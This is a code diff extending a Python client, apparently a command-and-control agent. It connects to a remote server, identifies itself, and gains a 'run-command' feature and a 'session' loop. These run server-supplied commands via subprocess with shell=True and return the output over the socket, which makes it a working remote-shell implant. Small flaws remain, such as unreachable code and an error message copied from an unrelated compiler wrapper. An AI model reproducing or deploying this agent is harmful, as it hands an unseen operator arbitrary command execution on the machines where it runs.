@@ -4,6 +4,7 @@ import logging
 import time
 import random
 import string
+import subprocess
 
 logging.basicConfig(level=logging.DEBUG)
 logging.basicConfig(filename='client.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s', force=True)
@@ -24,9 +25,9 @@ class MClient:
             self.send_identification_to_server(conn=self.connected_socket)
             msg_from_server = self.recieve_msg(conn=self.connected_socket)
             #print(msg_from_server)
-            logging.debug(f"[MClient Python (run)] Message From server: {self.bytes_decode(msg_from_server)}")
-            client_results = self.decision_tree(self.bytes_decode(msg_from_server))
-            #self.send_msg(client_results)
+            logging.debug(f"[MClient Python (run)] Message From server: {msg_from_server}")
+            client_results = self.decision_tree(msg_from_server)
+            self.send_msg(client_results, self.connected_socket)
             # disconnect
             #time.sleep(heartbeat)
 
@@ -53,13 +54,29 @@ class MClient:
         conn.send(self.str_encode(f"!_client_!\\|/{self.client_id}\\|/{self.client_id}"))
 
     def decision_tree(self, command=""):
-        if command == "" or command.lower() == "help":
-            help_command = """
-            Python Agent Help Menu:
-            
-            help: Shows the help data
-            """
+        print(f"command from server: {command}")
+        if command.lower() == "session":
+            while True:
+                session_command = self.recieve_msg(self.connected_socket)
+                if session_command.lower() == "break":
+                    return "session breaking"
+                    break
+                else:
+                    session_command_results = self.decision_tree(command=session_command)
+                    return session_command_results
+                    #self.send_msg(session_command_results)
+
+        elif command == "" or command.lower() == "help":
+            help_command = "Python Agent Help Menu:\n\n" \
+            "help: Shows the help data\n" \
+            "\n[System]" \
+            "run-command COMMAND: Runs a command on the system. Platform agnostic\n"
+
             return help_command
+
+        elif "run-command" in command.lower():
+            system_command = command.replace("run-command","")
+            return System.run_command(system_command)
 
     @staticmethod
     def generate_client_id():
@@ -69,7 +86,7 @@ class MClient:
 
         return client_id
 
-    def send_msg(self, msg, conn):
+    def send_msg(self, msg="NoMSG", conn=socket):
         ## clients need to have a shared known header beforehand. Default is 10
         HEADER_BYTES = 10
         BUFFER = 1024
@@ -96,7 +113,7 @@ class MClient:
         #recv_msg = self.recieve_msg(self.server)
         #return recv_msg
 
-    def recieve_msg(self, conn):
+    def recieve_msg(self, conn=socket):
         complete_msg = ""
         ## clients need to have a shared known header beforehand. Default is 10
         HEADER_BYTES = 10
@@ -136,6 +153,19 @@ class MClient:
     def str_encode(self, input) -> bytes:
         encoded_result = input.encode()
         return encoded_result
+
+class System:
+    @staticmethod
+    def run_command(command):
+        try:
+            output = subprocess.check_output(
+                command, stderr=subprocess.STDOUT, shell=True, timeout=3,
+                universal_newlines=True)
+            return output
+        except subprocess.CalledProcessError as exc:
+            return f"{exc.returncode, exc.output}"
+        except Exception as e:
+            return f"[CompilationWrapper(GCC: compile)] Unknown Error when compiling: {e}"
 
 #client = MClient(ip="IPADDRESS",port=PORT)
 
